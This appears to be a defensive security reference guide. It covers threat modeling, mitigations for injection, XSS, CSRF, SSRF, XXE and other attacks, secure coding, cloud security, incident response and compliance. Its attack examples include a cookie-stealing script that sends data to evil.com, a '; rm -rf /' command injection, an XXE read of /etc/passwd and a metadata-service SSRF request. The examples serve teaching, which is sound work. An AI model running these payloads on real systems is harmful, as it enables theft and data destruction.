# 🔒 SKILL-06: Security & Cyber Defense

> **Domain:** Application Security, Infrastructure Security, Threat Mitigation  
> **Level:** Expert / Principal  
> **Scope:** Defense-in-depth, threat modeling, attack mitigation, compliance, incident response, secure coding

---

## 1. PHILOSOPHY

Security is not a feature — it is a **property of the system**.
- Assume breach: Design as if attackers are already inside
- Defense in depth: No single point of failure
- Least privilege: Minimum access necessary
- Security by design: Build it in, not bolt it on
- Zero trust: Verify everything, trust nothing

---

## 2. THREAT MODELING

### 2.1 STRIDE Framework
```
S - Spoofing: Pretending to be someone else
T - Tampering: Modifying data or code
R - Repudiation: Denying an action
I - Information Disclosure: Exposing data
D - Denial of Service: Disrupting availability
E - Elevation of Privilege: Gaining unauthorized access

THREAT MODELING PROCESS:
1. Define scope and boundaries (data flow diagram)
2. Identify assets and trust boundaries
3. Apply STRIDE to each component
4. Rate threats (DREAD: Damage, Reproducibility, Exploitability, Affected users, Discoverability)
5. Plan mitigations
6. Validate and iterate
```

### 2.2 Data Flow Diagram (DFD) for Threat Modeling
```
ELEMENTS:
├── Process (circle): Application, service, function
├── Data Store (parallel lines): Database, file, cache
├── Data Flow (arrow): Data movement
├── External Entity (rectangle): User, third-party system
└── Trust Boundary (dashed line): Security perimeter

EXAMPLE:
[User] --(HTTPS)--> [Web App] --(SQL)--> [Database]
   ↑                    ↑
Trust Boundary    Trust Boundary
```

### 2.3 Attack Tree Analysis
```
GOAL: Steal Customer Data
├── AND: Gain Database Access
│   ├── OR: SQL Injection
│   │   ├── Union-based injection
│   │   ├── Error-based injection
│   │   └── Blind injection
│   ├── OR: Compromise Application Server
│   │   ├── Exploit RCE vulnerability
│   │   ├── Stolen credentials
│   │   └── Supply chain attack
│   └── OR: Direct Database Access
│       ├── Exposed port (misconfiguration)
│       ├── Weak/default credentials
│       └── Insider threat
└── AND: Exfiltrate Data
    ├── OR: Through Application
    │   ├── Large result sets
    │   ├── Error messages with data
    │   └── Logging of sensitive data
    └── OR: Through Network
        ├── Unencrypted backup
        └── DNS tunneling
```

---

## 3. DEFENSE AGAINST ATTACK VECTORS

### 3.1 Injection Attacks

#### SQL Injection (SQLi)
```
ATTACK:
  Input: ' OR '1'='1' --
  Query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
  Result: Returns all users

DEFENSE:
├── Parameterized Queries (Prepared Statements) — MANDATORY
├── ORM with proper escaping
├── Input validation (whitelist, not blacklist)
├── Least privilege database accounts
├── WAF (Web Application Firewall) rules
├── Error handling (no SQL details in errors)
└── Regular scanning (SQLMap, Burp Suite)

CODE EXAMPLE (Safe):
  String query = "SELECT * FROM users WHERE username = ?";
  PreparedStatement stmt = conn.prepareStatement(query);
  stmt.setString(1, userInput);  // Automatic escaping
```

#### NoSQL Injection
```
ATTACK:
  Input: {"$gt": ""}
  Query: db.users.find({username: {"$gt": ""}})
  Result: Returns all users

DEFENSE:
├── Input validation and sanitization
├── Parameterized queries where supported
├── Type casting (force string/number types)
├── Avoid $where, mapReduce with user input
└── Principle of least privilege
```

#### Command Injection
```
ATTACK:
  Input: ; rm -rf /
  Command: ping ; rm -rf /

DEFENSE:
├── Never pass user input to system commands
├── Use language-native libraries instead of shell commands
├── If unavoidable: strict whitelist validation
├── Run with minimal privileges
└── Sandbox/containerize execution
```

#### LDAP Injection
```
DEFENSE:
├── Escape special characters (*, (, ), \, NUL)
├── Parameterized LDAP queries
├── Input validation
└── Least privilege LDAP binds
```

### 3.2 Cross-Site Scripting (XSS)

```
TYPES:
├── Stored XSS: Malicious script stored in database
├── Reflected XSS: Malicious script in URL/parameters
└── DOM-based XSS: Client-side JavaScript manipulation

ATTACK EXAMPLES:
  Stored: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
  Reflected: https://site.com/search?q=<script>alert('XSS')</script>
  DOM: https://site.com/#<img src=x onerror=alert('XSS')>

DEFENSE (Defense in Depth):
├── Output Encoding (context-aware):
│   ├── HTML body: HTML entity encoding (& → &amp;)
│   ├── HTML attribute: Attribute encoding
│   ├── JavaScript: JS encoding
│   ├── URL: URL encoding
│   └── CSS: CSS encoding
├── Content Security Policy (CSP):
│   ├── default-src 'self'
│   ├── script-src 'self' 'nonce-{random}'
│   ├── style-src 'self'
│   ├── img-src 'self' data:
│   ├── connect-src 'self'
│   └── report-uri /csp-report
├── Input Validation (whitelist approach)
├── HttpOnly Cookies (prevent JavaScript access)
├── Secure Cookie Flag (HTTPS only)
├── X-XSS-Protection header (legacy, use CSP instead)
├── Modern framework auto-escaping (React, Vue, Angular)
└── Regular penetration testing
```

### 3.3 Cross-Site Request Forgery (CSRF)
```
ATTACK:
  User is logged into bank.com
  User visits evil.com which contains:
  <img src="https://bank.com/transfer?to=attacker&amount=10000">
  Bank processes transfer because user is authenticated

DEFENSE:
├── CSRF Tokens (synchronizer token pattern):
│   ├── Server generates random token per session
│   ├── Token embedded in forms/headers
│   ├── Server validates token on state-changing requests
│   └── Token changes per request (double-submit cookie)
├── SameSite Cookies:
│   ├── SameSite=Strict: Never send in cross-site requests
│   ├── SameSite=Lax: Send only for top-level navigation GET
│   └── SameSite=None: Send always (requires Secure)
├── Custom Request Headers (X-Requested-With)
├── User interaction required for sensitive actions
└── Re-authentication for critical operations
```

### 3.4 Authentication & Session Attacks

#### Brute Force & Credential Stuffing
```
ATTACK:
├── Automated username/password guessing
├── Using leaked credential databases
└── Dictionary attacks

DEFENSE:
├── Rate Limiting:
│   ├── 5 attempts per IP per 15 minutes
│   ├── Progressive delays (exponential backoff)
│   └── Account lockout after N attempts (with unlock mechanism)
├── CAPTCHA / ReCAPTCHA after failed attempts
├── Strong password policy (length > 12, complexity)
├── Multi-Factor Authentication (MFA) — MANDATORY for sensitive accounts
├── Password breach detection (HaveIBeenPwned API)
├── Account lockout notifications
├── IP-based anomaly detection
└── Device fingerprinting
```

#### Session Hijacking & Fixation
```
DEFENSE:
├── Secure session ID generation (cryptographically random, 128+ bits)
├── Session ID regeneration on privilege change (login, password change)
├── Short session timeout (15-30 minutes idle)
├── Absolute session timeout (8-24 hours)
├── Secure flag on session cookies (HTTPS only)
├── HttpOnly flag (no JavaScript access)
├── SameSite=Strict or Lax
├── Session invalidation on logout
├── Server-side session storage (not client-side JWT for sensitive ops)
├── Session binding to IP/User-Agent (with caution)
└── Concurrent session limits
```

### 3.5 Denial of Service (DoS) / Distributed DoS (DDoS)

```
ATTACK TYPES:
├── Volumetric: Flood bandwidth (UDP amplification, DNS reflection)
├── Protocol: Exhaust resources (SYN flood, Ping of Death)
├── Application: Exhaust application resources (Slowloris, HTTP flood, complex queries)
└── Amplification: Small request → Large response (DNS, NTP, SSDP)

DEFENSE:
├── Network Layer:
│   ├── DDoS mitigation service (Cloudflare, AWS Shield, Akamai)
│   ├── Rate limiting at edge (CDN, load balancer)
│   ├── SYN cookies for SYN flood
│   ├── Blackhole routing (RTBH)
│   └── Traffic scrubbing
├── Application Layer:
│   ├── Request rate limiting per IP/user
│   ├── Resource quotas (CPU, memory, DB connections)
│   ├── Circuit breakers for downstream services
│   ├── Queue-based request handling
│   ├── Challenge-response (CAPTCHA) for suspicious traffic
│   └── Auto-scaling (with cost controls)
├── Infrastructure:
│   ├── Redundancy (multi-region, multi-AZ)
│   ├── Load balancing (health checks, failover)
│   ├── CDN for static content
│   ├── Connection limits
│   └── Monitoring and alerting (traffic anomaly detection)
└── Operational:
    ├── Incident response plan
    ├── Communication plan
    ├── Forensic logging
    └── Law enforcement coordination
```

### 3.6 Man-in-the-Middle (MitM) & Eavesdropping
```
DEFENSE:
├── TLS 1.2+ everywhere (disable SSLv3, TLS 1.0, 1.1)
├── Certificate pinning (mobile apps)
├── HSTS (HTTP Strict Transport Security):
│   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
├── Perfect Forward Secrecy (ECDHE cipher suites)
├── Strong cipher suites only
├── Certificate transparency monitoring
├── Mutual TLS (mTLS) for service-to-service
└── Network segmentation
```

### 3.7 Server-Side Request Forgery (SSRF)
```
ATTACK:
  Input: http://169.254.169.254/latest/meta-data/
  Application fetches URL, exposing cloud metadata

DEFENSE:
├── URL validation (whitelist allowed domains)
├── Disable unnecessary URL schemas (file://, gopher://, dict://)
├── Network segmentation (application cannot reach internal services)
├── DNS resolution validation (resolve then check IP)
├── Response length and type limits
└── Disable HTTP redirects or validate redirect targets
```

### 3.8 Insecure Deserialization
```
ATTACK:
  Malicious serialized object executes code during deserialization

DEFENSE:
├── Avoid native serialization formats (Java ObjectInputStream, Python pickle)
├── Use safe formats: JSON, Protocol Buffers, MessagePack
├── If native required:
│   ├── Digital signatures on serialized data
│   ├── Strict type whitelisting
│   ├── Input validation before deserialization
│   └── Run in isolated sandbox
├── Integrity checks (HMAC)
└── Logging and monitoring
```

### 3.9 XML External Entity (XXE)
```
ATTACK:
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <foo>&xxe;</foo>

DEFENSE:
├── Disable DTDs (Document Type Definitions) completely
├── Disable external entities
├── Use less complex formats (JSON instead of XML)
├── XML parser configuration:
│   ├── libxml2: LIBXML_NONET, LIBXML_DTDLOAD off
│   ├── Java: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
│   └── .NET: XmlReaderSettings.DtdProcessing = Prohibit
├── Input validation
└── WAF rules
```

### 3.10 Security Misconfiguration
```
COMMON MISCONFIGURATIONS:
├── Default credentials (admin/admin, root/root)
├── Unnecessary features enabled
├── Directory listing enabled
├── Information leakage (stack traces, server versions)
├── Missing security headers
├── Unpatched systems
├── Cloud storage buckets public
├── Overly permissive CORS
└── Verbose error messages

DEFENSE:
├── Hardening guides (CIS Benchmarks)
├── Automated configuration scanning
├── Infrastructure as Code (IaC) with security policies
├── Regular security audits
├── Minimal installation principle
├── Security headers:
│   ├── X-Content-Type-Options: nosniff
│   ├── X-Frame-Options: DENY (or CSP frame-ancestors)
│   ├── X-XSS-Protection: 1; mode=block
│   ├── Referrer-Policy: strict-origin-when-cross-origin
│   ├── Permissions-Policy: geolocation=(), microphone=()
│   └── Content-Security-Policy (see XSS section)
└── Cloud security posture management (CSPM)
```

### 3.11 Insufficient Logging & Monitoring
```
DEFENSE:
├── Log all security events:
│   ├── Authentication (success, failure, lockout)
│   ├── Authorization (access denied)
│   ├── Data access (sensitive data reads)
│   ├── Data modification (create, update, delete)
│   ├── Administrative actions
│   ├── Security configuration changes
│   └── Anomalies (unusual patterns)
├── Log format: Structured (JSON), timestamped, correlated
├── Centralized log aggregation (SIEM)
├── Real-time alerting:
│   ├── Multiple failed logins
│   ├── Privilege escalation
│   ├── Unusual data access volume
│   ├── Geographic anomalies
│   └── Off-hours access
├── Log integrity (tamper-proof storage)
├── Log retention (compliance-driven: 1-7 years)
└── Regular log review and analysis
```

### 3.12 Supply Chain Attacks
```
ATTACK VECTORS:
├── Malicious dependencies (npm, PyPI, Maven)
├── Compromised build tools
├── Tampered container images
├── Malicious IDE extensions
└── Compromised CI/CD pipelines

DEFENSE:
├── Dependency scanning (Snyk, OWASP Dependency-Check)
├── Lock files (package-lock.json, yarn.lock, poetry.lock)
├── Private artifact repository (Nexus, Artifactory)
├── Software Bill of Materials (SBOM)
├── Code signing (artifacts, containers)
├── Container image scanning (Trivy, Clair)
├── Reproducible builds
├── Vendor security assessments
├── Minimal base images (distroless, Alpine)
└── Runtime application self-protection (RASP)
```

---

## 4. SECURE CODING PRACTICES

### 4.1 Input Validation
```
PRINCIPLES:
├── Validate on server side (never trust client)
├── Whitelist, don't blacklist
├── Validate type, length, format, range
├── Reject, don't sanitize (or sanitize then validate)
├── Use strong typing
├── Canonicalize before validation
└── Validate at trust boundaries

EXAMPLE:
  // Bad
  if (!input.contains("<script>")) { ... }

  // Good
  Pattern emailPattern = Pattern.compile("^[A-Za-z0-9+_.-]+@(.+)$");
  Matcher matcher = emailPattern.matcher(input);
  if (matcher.matches()) { ... }
```

### 4.2 Output Encoding
```
CONTEXT-AWARE ENCODING:
├── HTML: HtmlEncode
├── HTML Attribute: HtmlAttributeEncode
├── JavaScript: JavaScriptEncode
├── URL: UrlEncode
├── CSS: CssEncode
├── SQL: Parameterized queries (not encoding)
├── XML: XmlEncode
└── LDAP: LdapEncode
```

### 4.3 Authentication Best Practices
```
├── Use established frameworks (OAuth 2.0, OpenID Connect, SAML)
├── Never roll your own crypto
├── Store passwords with strong hashing (Argon2, bcrypt, scrypt)
├── Salt + Pepper for password hashing
├── Implement MFA (TOTP, WebAuthn/FIDO2, SMS as fallback)
├── Session management (see Section 3.4)
├── Account enumeration prevention (same message for invalid user/pass)
├── Secure password reset (token-based, short expiry, single use)
├── Account lockout with unlock mechanism
├── Audit all authentication events
└── Implement progressive profiling
```

### 4.4 Authorization Best Practices
```
├── Principle of least privilege
├── Role-Based Access Control (RBAC) for coarse permissions
├── Attribute-Based Access Control (ABAC) for fine-grained
├── Access Control Lists (ACL) for resource-specific
├── Deny by default
├── Validate authorization on every request (server-side)
├── Prevent insecure direct object references (IDOR)
├── Implement horizontal and vertical access controls
├── Regular access reviews
├── Just-in-time (JIT) access for elevated privileges
└── Log all authorization decisions
```

---

## 5. INFRASTRUCTURE SECURITY

### 5.1 Cloud Security
```
IDENTITY & ACCESS:
├── IAM policies (least privilege)
├── MFA for all users
├── Service accounts (no human credentials)
├── Regular access reviews
├── Privileged access management (PAM)
└── Break-glass procedures

NETWORK:
├── VPC/VNet isolation
├── Security groups / NSGs (default deny)
├── Network segmentation (DMZ, internal, database)
├── Private subnets for databases
├── VPN / Direct Connect for admin access
├── DDoS protection
└── Network flow logging

DATA:
├── Encryption at rest (AES-256)
├── Encryption in transit (TLS 1.2+)
├── Key management (HSM, KMS)
├── Data classification (public, internal, confidential, restricted)
├── Data loss prevention (DLP)
├── Backup encryption
└── Secure deletion

MONITORING:
├── CloudTrail / Activity Log
├── GuardDuty / Security Center
├── Config rules
├── Vulnerability scanning
├── Penetration testing
└── Compliance dashboards
```

### 5.2 Container Security
```
├── Minimal base images (distroless, scratch, Alpine)
├── No root user in containers
├── Read-only filesystems where possible
├── Resource limits (CPU, memory, PID)
├── Security contexts (seccomp, AppArmor, SELinux)
├── Image scanning (Trivy, Clair, Snyk)
├── Image signing (Cosign, Notary)
├── Runtime protection (Falco, Sysdig)
├── Network policies (pod-to-pod restrictions)
├── Secrets management (Vault, Kubernetes secrets + encryption)
└── Regular base image updates
```

---

## 6. INCIDENT RESPONSE

### 6.1 Incident Response Lifecycle
```
PREPARATION:
├── Incident response plan documented
├── Response team identified (roles, contacts)
├── Tools and resources ready
├── Training and tabletop exercises
├── Legal and PR contacts
└── Insurance review

DETECTION & ANALYSIS:
├── Monitoring and alerting
├── Triage and classification (severity)
├── Evidence preservation
├── Initial containment assessment
└── Stakeholder notification

CONTAINMENT:
├── Short-term: Stop bleeding (isolate affected systems)
├── Long-term: Secure environment for recovery
├── Evidence collection
├── Communication plan execution
└── Regulatory notification assessment

ERADICATION:
├── Root cause identification
├── Threat removal
├── Vulnerability remediation
├── Backdoor elimination
└── System hardening

RECOVERY:
├── System restoration from clean backups
├── Validation of system integrity
├── Gradual return to production
├── Enhanced monitoring
└── User communication

POST-INCIDENT:
├── Lessons learned meeting
├── Incident report
├── Process improvements
├── Tool enhancements
├── Training updates
└── Metrics update
```

---

## 7. COMPLIANCE FRAMEWORKS

### 7.1 Key Standards
```
GDPR (EU):
├── Lawful basis for processing
├── Data minimization
├── Purpose limitation
├── Storage limitation
├── Accuracy
├── Integrity and confidentiality
├── Accountability
├── Data subject rights (access, erasure, portability)
├── Breach notification (72 hours)
└── DPO requirement (if applicable)

SOC 2 (Service Organization Control):
├── Security (common criteria)
├── Availability
├── Processing Integrity
├── Confidentiality
├── Privacy
└── Type I (point in time) vs Type II (over time)

PCI DSS (Payment Card Industry):
├── Secure network (firewalls)
├── Protect cardholder data (encryption)
├── Vulnerability management
├── Access control
├── Monitor and test networks
├── Information security policy
└── 12 requirements, ~300 sub-requirements

HIPAA (Healthcare - US):
├── Administrative safeguards
├── Physical safeguards
├── Technical safeguards
├── Breach notification
└── Business associate agreements

NIST Cybersecurity Framework:
├── Identify
├── Protect
├── Detect
├── Respond
└── Recover
```

---

**[END OF SKILL-06]**
